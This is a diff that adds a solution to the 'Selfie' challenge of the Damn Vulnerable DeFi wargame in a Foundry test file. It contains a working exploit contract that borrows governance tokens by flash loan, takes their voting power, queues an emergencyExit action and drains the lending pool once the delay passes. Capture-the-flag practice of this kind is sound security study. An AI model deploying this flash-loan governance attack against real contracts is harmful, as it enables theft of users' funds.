@@ -6,6 +6,36 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {Votes} from "@openzeppelin/contracts/governance/utils/Votes.sol";
+
+contract FlashLoanBorrower is IERC3156FlashBorrower {
+    address private immutable i_recover;
+    address private immutable i_pool;
+    address private immutable i_governance;
+
+    constructor(address _pool, address recoveryAddress, address governanceAddress) {
+        i_pool = _pool;
+        i_recover = recoveryAddress;
+        i_governance = governanceAddress;
+    }
+
+    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        require(DamnValuableVotes(token).balanceOf(address(this)) >= amount, "Insufficient balance for flash loan");
+        //delegate tokens to the contract itself
+        DamnValuableVotes(token).delegate(address(this));
+
+        bytes memory functionCall = abi.encodeCall(SelfiePool.emergencyExit, (i_recover));
+        SimpleGovernance(i_governance).queueAction(i_pool, 0, functionCall);
+        //approve the FlashLoan lender to transfer the tokens back
+        DamnValuableVotes(token).approve(msg.sender, amount + fee);
+        //return the tokens to the lender
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,7 +91,16 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {}
+    function test_selfie() public checkSolvedByPlayer {
+        FlashLoanBorrower borrower = new FlashLoanBorrower(address(pool), recovery, address(governance));
+        pool.flashLoan(borrower, address(token), TOKENS_IN_POOL, hex"");
+        assertEq(governance.getActionCounter(), 2, "Action counter should be 2");
+
+        vm.warp(block.timestamp + governance.getActionDelay());
+        //execute action
+        uint256 actionId = governance.getActionCounter() - 1; // Get the last action ID
+        governance.executeAction(actionId);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
